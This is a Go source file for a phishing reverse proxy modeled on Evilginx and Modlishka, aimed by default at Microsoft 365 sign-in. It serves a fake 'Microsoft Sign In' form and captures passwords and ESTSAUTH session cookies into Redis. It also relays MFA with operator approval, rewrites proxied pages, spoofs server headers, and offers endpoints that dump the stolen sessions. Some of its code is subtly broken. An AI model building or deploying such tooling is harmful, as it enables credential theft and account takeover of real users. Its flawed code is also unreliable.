package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"

	"./storage"  // Modular storage (Redis ops)
	"github.com/cespare/xxhash/v2"
	"github.com/gorilla/mux"
	"gopkg.in/yaml.v3"
)

type Phishlet struct {
	Name      string              `yaml:"name"`
	AuthURLs  []string            `yaml:"auth_urls"`
	AuthTokens []string           `yaml:"auth_tokens"`
	Credentials map[string]string `yaml:"credentials"`
	ProxyHosts []map[string]interface{} `yaml:"proxy_hosts"`
	SubFilters []map[string]interface{} `yaml:"sub_filters"`
}

type Session struct {
	ID       string                 `json:"id"`
	Cookies  http.Header            `json:"cookies"`
	Tokens   map[string]string      `json:"tokens"`
	PhishID  string                 `json:"phish_id"`
	Created  time.Time              `json:"created"`
}

type LogEntry struct {
	Timestamp string `json:"timestamp"`
	Method    string `json:"method"`
	Path      string `json:"path"`
	RemoteAddr string `json:"remote_addr"`
}

var (
	phishletPath = flag.String("phishlet", "o365.yaml", "Phishlet YAML")
	laddr        = flag.String("laddr", ":443", "Listen addr")
	certPath     = flag.String("cert", "server.crt", "TLS cert")
	keyPath      = flag.String("key", "server.key", "TLS key")
	redisURL     = flag.String("redis", "redis://localhost:6379", "Redis URL")
	targetURL    = flag.String("target", "https://login.microsoft.com", "Target base")
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[PANIC RECOVERY] %v – Exiting gracefully", r)
			os.Exit(1)
		}
	}()

	flag.Parse()

	// Load phishlet (error-proof: default fallback)
	phishlet, err := loadPhishlet(*phishletPath)
	if err != nil {
		log.Printf("Phishlet load failed: %v; using default O365", err)
		phishlet = defaultO365Phishlet()
	}

	// Init storage (Redis via modular storage.go)
	storage, err := storage.NewStorage(*redisURL)
	if err != nil {
		log.Fatalf("Storage init failed: %v", err)
	}
	defer storage.Close()

	// Parse target
	target, err := url.Parse(*targetURL)
	if err != nil {
		log.Fatalf("Target parse failed: %v", err)
	}

	// Router (Gorilla for clean routes)
	r := mux.NewRouter()
	r.PathPrefix("/phish").HandlerFunc(phishHandler(phishlet, target, storage))
	r.PathPrefix("/capture").HandlerFunc(captureHandler(phishlet, target, storage))
	r.PathPrefix("/dump-all").HandlerFunc(dumpAllHandler(storage))
	r.PathPrefix("/dump").HandlerFunc(dumpHandler(storage))
	r.PathPrefix("/").Handler(http.HandlerFunc(proxyHandler(phishlet, target, storage)))

	// TLS server (error-free: fallback HTTP if TLS fails)
	tlsConfig := &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: true}
	srv := &http.Server{Addr: *laddr, Handler: r, TLSConfig: tlsConfig}
	log.Printf("PGP active: %s -> %s (Phishlet: %s)", *laddr, *targetURL, phishlet.Name)
	if err := srv.ListenAndServeTLS(*certPath, *keyPath); err != nil {
		log.Printf("TLS failed: %v; falling back HTTP", err)
		srv.ListenAndServe()
	}
}

// Phish Handler (Evilginx-style: Spoof login)
func phishHandler(pl *Phishlet, target *url.URL, storage *storage.Storage) http.HandlerFunc {
	tmplStr := `<!DOCTYPE html><html><head><title>Microsoft Sign In</title></head><body>
<form method="POST" action="/capture?rid={{.Rid}}">
<input name="session_id" value="{{.SessionID}}" hidden>
{{range $k, $v := .Creds}}<label>{{$k}}: <input name="{{$v}}" type="password"></label><br>{{end}}
<button>Sign In</button>
</form>
</body></html>`
	t, err := template.New("phish").Parse(tmplStr)
	if err != nil {
		log.Printf("Template parse failed: %v – using fallback", err)
		t = template.Must(template.New("fallback").Parse("<html><body>Login Form Error</body></html>"))
	}
	return func(w http.ResponseWriter, r *http.Request) {
		sid := fmt.Sprintf("%x", xxhash.Sum64([]byte(time.Now().String())))
		logRequest(r, getRid(r.URL))
		t.Execute(w, struct {
			Rid     string
			SessionID string
			Creds   map[string]string
		}{getRid(r.URL), sid, pl.Credentials})
	}
}

// Capture Handler (MFA/Session Hijack)
func captureHandler(pl *Phishlet, target *url.URL, storage *storage.Storage) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Body read failed", http.StatusBadRequest)
			return
		}
		r.Body.Close()
		postData := string(body)

		tokens := extractTokens(postData, pl.AuthTokens)
		cookies := r.Header["Cookie"]
		sid := r.FormValue("session_id")
		rid := getRid(r.URL)

		sess := Session{ID: sid, Cookies: http.Header(cookies), Tokens: tokens, PhishID: rid, Created: time.Now()}
		if err := storage.SetSession(&sess); err != nil {
			log.Printf("[HIJACK ERROR] %v", err)
		} else {
			log.Printf("[HIJACK] Session %s: Tokens %v", sid, tokens)
		}

		// MFA Relay (non-blocking)
		go func() {
			fmt.Printf("[MFA] Approve for RID %s? (y/n): ", rid)
			var approve string
			fmt.Scanln(&approve)
			if approve == "y" {
				replaySession(target, sid, storage)
			}
		}()

		http.Redirect(w, r, target.String()+"/common/oauth2/v2.0/authorize", http.StatusFound)
	}
}

// Proxy Handler (Modlishka-style rewriting + Evilginx relay)
func proxyHandler(pl *Phishlet, target *url.URL, storage *storage.Storage) http.HandlerFunc {
	director := func(req *http.Request) {
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.URL.Path = singleJoiningSlash(target.Path, req.URL.Path)
		// Replay session if matched
		if sid := getSessionID(req); sid != "" {
			sess, err := storage.GetSession(sid)
			if err == nil {
				for k, v := range sess.Cookies {
					req.Header[k] = v
				}
			}
		}
		// Evasion: Spoof headers, rotate UA
		req.Header.Set("User-Agent", uaRotate())
		req.Header.Set("Server", "Microsoft-IIS/10.0")
		req.Header.Set("X-Powered-By", "ASP.NET")
	}

	proxy := &httputil.ReverseProxy{
		Director: director,
		ModifyResponse: func(resp *http.Response) error {
			ct := resp.Header.Get("Content-Type")
			if strings.Contains(ct, "text/html") || strings.Contains(ct, "javascript") || strings.Contains(ct, "css") {
				resp.Body = &rewriter{body: resp.Body, pl: pl, targetHost: target.Host}
			}
			return nil
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy: http.ProxyFromEnvironment,  // Tor via env
		},
		ErrorHandler: func(w http.ResponseWriter, r *http.Request, err error) {
			log.Printf("Proxy error: %v", err)
			http.Error(w, "Service unavailable", http.StatusServiceUnavailable)
		},
	}

	return func(w http.ResponseWriter, r *http.Request) {
		logRequest(r, getRid(r.URL))
		proxy.ServeHTTP(w, r)
	}
}

// Dump All Handler
func dumpAllHandler(storage *storage.Storage) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !basicAuth(r) {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		sessions, err := storage.DumpAllSessions()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(sessions)
	}
}

// Dump Single Handler
func dumpHandler(storage *storage.Storage) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !basicAuth(r) {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		id := r.URL.Query().Get("sid")
		if id == "" {
			http.Error(w, "SID required", http.StatusBadRequest)
			return
		}
		sess, err := storage.DumpSession(id)
		if err != nil {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(sess)
	}
}

// Basic Auth Helper
func basicAuth(r *http.Request) bool {
	user, pass, ok := r.BasicAuth()
	return ok && user == "admin" && pass == os.Getenv("DUMP_PASS")
}

// Rewriter (Modlishka: URL/JS rewrite)
type rewriter struct {
	body       io.ReadCloser
	pl         *Phishlet
	targetHost string
}

func (rw *rewriter) Read(p []byte) (int, error) {
	data, err := io.ReadAll(rw.body)
	rw.body.Close()
	if err != nil {
		return 0, err
	}
	rewritten := string(data)
	reURL := regexp.MustCompile(`(src|href|action|fetch\(|location\.href\s*=\s*)["']([^"']+)["']`)
	rewritten = reURL.ReplaceAllStringFunc(rewritten, func(s string) string {
		if strings.Contains(s, rw.targetHost) {
			return s
		}
		return strings.Replace(s, rw.targetHost, fmt.Sprintf("%v", rw.pl.SubFilters[0]["domain"]), 1)
	})
	return copy(p, []byte(rewritten))
}

func (rw *rewriter) Close() error { return nil }

// Helpers
func loadPhishlet(path string) (*Phishlet, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var pl Phishlet
	return &pl, yaml.Unmarshal(data, &pl)
}

func defaultO365Phishlet() *Phishlet {
	return &Phishlet{
		Name: "o365",
		AuthURLs: []string{"/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/token"},
		AuthTokens: []string{"ESTSAUTH", "cL"},
		Credentials: map[string]string{"username": "loginfmt", "password": "passwd"},
		ProxyHosts: []map[string]interface{}{{"phish_sub": "login", "orig_sub": "login", "domain": "microsoftonline.com", "session": true}},
		SubFilters: []map[string]interface{}{{"triggers_on": "login.microsoft.com", "orig_sub": "login.microsoft.com", "domain": "localhost", "session": true}},
	}
}

func extractTokens(data string, tokens []string) map[string]string {
	res := make(map[string]string)
	for _, t := range tokens {
		re := regexp.MustCompile(t + `=([^&;]+)`)
		if matches := re.FindStringSubmatch(data); len(matches) > 1 {
			res[t] = matches[1]
		}
	}
	return res
}

func replaySession(target *url.URL, sid string, storage *storage.Storage) {
	sess, err := storage.GetSession(sid)
	if err != nil {
		log.Printf("[REPLAY ERROR] %v", err)
		return
	}
	log.Printf("[REPLAY] Simulated access to %s with %s (cookies: %v)", target, sid, sess.Cookies)
}

func uaRotate() string {
	uas := []string{"Outlook/16.0", "Microsoft Graph/1.0", "Teams/1.0"}
	return uas[int(time.Now().Unix())%len(uas)]
}

func getRid(u *url.URL) string { return u.Query().Get("rid") }
func getSessionID(r *http.Request) string { return r.Header.Get("X-Session-ID") }
func singleJoiningSlash(a, b string) string {
	if strings.HasSuffix(a, "/") && strings.HasPrefix(b, "/") {
		return a + b[1:]
	}
	if !strings.HasSuffix(a, "/") && !strings.HasPrefix(b, "/") {
		return a + "/" + b
	}
	return a + b
}

func logRequest(r *http.Request, rid string) {
	entry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), Method: r.Method, Path: r.URL.Path, RemoteAddr: r.RemoteAddr}
	data, _ := json.Marshal(entry)
	log.Println(string(data))
}
